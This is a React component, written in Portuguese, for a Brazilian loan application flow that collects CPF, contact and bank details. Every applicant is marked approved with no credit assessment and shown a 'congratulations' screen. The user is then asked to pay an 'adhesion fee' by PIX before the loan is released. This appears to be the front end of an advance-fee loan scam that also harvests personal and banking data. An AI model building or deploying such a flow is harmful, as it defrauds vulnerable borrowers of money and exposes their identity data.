import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/hooks/useAuth';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { z } from 'zod';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

const personalDataSchema = z.object({
  name: z.string().trim().min(3, 'Nome deve ter no mínimo 3 caracteres').max(100),
  email: z.string().email('Email inválido').max(255),
  phone: z.string().trim().min(10, 'Telefone inválido').max(15),
  cpf: z.string().trim().min(11, 'CPF inválido').max(14),
});

const bankDataSchema = z.object({
  agency: z.string().trim().min(3, 'Agência inválida').max(10),
  account: z.string().trim().min(3, 'Conta inválida').max(20),
  holderName: z.string().trim().min(3, 'Nome inválido').max(100),
  holderCpf: z.string().trim().min(11, 'CPF inválido').max(14),
});

const LoanFlow = () => {
  const [step, setStep] = useState(1);
  const [settings, setSettings] = useState<any>(null);
  const [loanId, setLoanId] = useState<string | null>(null);
  const { user } = useAuth();
  const navigate = useNavigate();

  const [personalData, setPersonalData] = useState({
    name: '',
    email: '',
    phone: '',
    cpf: '',
  });

  const [bankData, setBankData] = useState({
    agency: '',
    account: '',
    holderName: '',
    holderCpf: '',
  });

  useEffect(() => {
    if (!user) {
      navigate('/auth');
      return;
    }
    fetchSettings();
  }, [user, navigate]);

  const fetchSettings = async () => {
    const { data } = await supabase
      .from('admin_settings')
      .select('*')
      .single();
    
    if (data) {
      setSettings(data);
    }
  };

  const handlePersonalDataSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const validation = personalDataSchema.safeParse(personalData);
    if (!validation.success) {
      toast.error(validation.error.errors[0].message);
      return;
    }

    try {
      const { data, error } = await supabase
        .from('loan_applications')
        .insert({
          user_id: user?.id,
          name: personalData.name,
          email: personalData.email,
          phone: personalData.phone,
          cpf: personalData.cpf,
          approved_amount: settings.approved_amount,
          adhesion_fee: settings.adhesion_fee,
          status: 'approved',
        })
        .select()
        .single();

      if (error) throw error;

      setLoanId(data.id);
      toast.success('Solicitação criada com sucesso!');
      setStep(2);
    } catch (error: any) {
      toast.error('Erro ao criar solicitação: ' + error.message);
    }
  };

  const handleBankDataSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const validation = bankDataSchema.safeParse(bankData);
    if (!validation.success) {
      toast.error(validation.error.errors[0].message);
      return;
    }

    if (bankData.holderCpf !== personalData.cpf) {
      toast.error('O CPF da conta deve ser o mesmo do cadastro');
      return;
    }

    try {
      const { error } = await supabase
        .from('loan_applications')
        .update({
          bank_agency: bankData.agency,
          bank_account: bankData.account,
          bank_account_holder: bankData.holderName,
          bank_account_cpf: bankData.holderCpf,
          status: 'payment_pending',
        })
        .eq('id', loanId);

      if (error) throw error;

      toast.success('Dados bancários salvos!');
      setStep(3);
    } catch (error: any) {
      toast.error('Erro ao salvar dados: ' + error.message);
    }
  };

  if (!settings) {
    return <div>Carregando...</div>;
  }

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      <main className="flex-1 py-16 bg-background">
        <div className="container mx-auto px-4 max-w-2xl">
          {step === 1 && (
            <div className="bg-card rounded-2xl shadow-lg p-8 border border-border">
              <h2 className="text-3xl font-bold text-foreground mb-6">
                Solicitação de Empréstimo
              </h2>
              <form onSubmit={handlePersonalDataSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="name">Nome Completo*</Label>
                  <Input
                    id="name"
                    value={personalData.name}
                    onChange={(e) => setPersonalData({ ...personalData, name: e.target.value })}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="email">Email*</Label>
                  <Input
                    id="email"
                    type="email"
                    value={personalData.email}
                    onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone">Telefone*</Label>
                  <Input
                    id="phone"
                    value={personalData.phone}
                    onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value })}
                    placeholder="(00) 00000-0000"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cpf">CPF*</Label>
                  <Input
                    id="cpf"
                    value={personalData.cpf}
                    onChange={(e) => setPersonalData({ ...personalData, cpf: e.target.value })}
                    placeholder="000.000.000-00"
                    required
                  />
                </div>

                <Button type="submit" className="w-full" size="lg">
                  Continuar
                </Button>
              </form>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-8">
              <div className="bg-gradient-to-r from-primary to-secondary rounded-2xl p-8 text-center text-white shadow-xl">
                <h2 className="text-2xl font-bold mb-2">Parabéns!</h2>
                <p className="text-lg mb-4">Seu empréstimo foi aprovado!</p>
                <div className="text-5xl font-bold">
                  R$ {settings.approved_amount.toFixed(2).replace('.', ',')}
                </div>
              </div>

              <div className="bg-card rounded-2xl shadow-lg p-8 border border-border">
                <h3 className="text-2xl font-bold text-foreground mb-6">
                  Dados da Conta para Recebimento
                </h3>
                <p className="text-muted-foreground mb-6">
                  Informe a conta onde deseja receber o valor. O CPF deve ser o mesmo do cadastro.
                </p>

                <form onSubmit={handleBankDataSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="agency">Agência*</Label>
                    <Input
                      id="agency"
                      value={bankData.agency}
                      onChange={(e) => setBankData({ ...bankData, agency: e.target.value })}
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="account">Conta*</Label>
                    <Input
                      id="account"
                      value={bankData.account}
                      onChange={(e) => setBankData({ ...bankData, account: e.target.value })}
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="holderName">Nome do Titular*</Label>
                    <Input
                      id="holderName"
                      value={bankData.holderName}
                      onChange={(e) => setBankData({ ...bankData, holderName: e.target.value })}
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="holderCpf">CPF do Titular*</Label>
                    <Input
                      id="holderCpf"
                      value={bankData.holderCpf}
                      onChange={(e) => setBankData({ ...bankData, holderCpf: e.target.value })}
                      placeholder="000.000.000-00"
                      required
                    />
                  </div>

                  <Button type="submit" className="w-full" size="lg">
                    Continuar para Pagamento
                  </Button>
                </form>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="bg-card rounded-2xl shadow-lg p-8 border border-border">
              <h3 className="text-2xl font-bold text-foreground mb-6">
                Pagamento da Taxa de Adesão
              </h3>
              
              <div className="bg-accent/10 rounded-lg p-6 mb-6 text-center">
                <p className="text-muted-foreground mb-2">Valor da taxa:</p>
                <p className="text-4xl font-bold text-foreground">
                  R$ {settings.adhesion_fee.toFixed(2).replace('.', ',')}
                </p>
              </div>

              {settings.pix_qr_code_url && (
                <div className="mb-6 text-center">
                  <p className="text-sm text-muted-foreground mb-4">Escaneie o QR Code:</p>
                  <img
                    src={settings.pix_qr_code_url}
                    alt="QR Code PIX"
                    className="mx-auto max-w-xs rounded-lg border-2 border-border"
                  />
                </div>
              )}

              {settings.pix_key && (
                <div className="mb-6">
                  <Label>Chave PIX:</Label>
                  <div className="flex gap-2 mt-2">
                    <Input value={settings.pix_key} readOnly />
                    <Button
                      type="button"
                      onClick={() => {
                        navigator.clipboard.writeText(settings.pix_key);
                        toast.success('Chave PIX copiada!');
                      }}
                    >
                      Copiar
                    </Button>
                  </div>
                </div>
              )}

              {settings.pix_copy_paste && (
                <div className="mb-6">
                  <Label>PIX Copia e Cola:</Label>
                  <div className="flex gap-2 mt-2">
                    <Input value={settings.pix_copy_paste} readOnly className="text-xs" />
                    <Button
                      type="button"
                      onClick={() => {
                        navigator.clipboard.writeText(settings.pix_copy_paste);
                        toast.success('Código PIX copiado!');
                      }}
                    >
                      Copiar
                    </Button>
                  </div>
                </div>
              )}

              <div className="bg-muted rounded-lg p-4 text-sm text-muted-foreground">
                Após realizar o pagamento, nossa equipe irá validar e liberar seu empréstimo em até 24 horas.
              </div>
            </div>
          )}
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default LoanFlow;
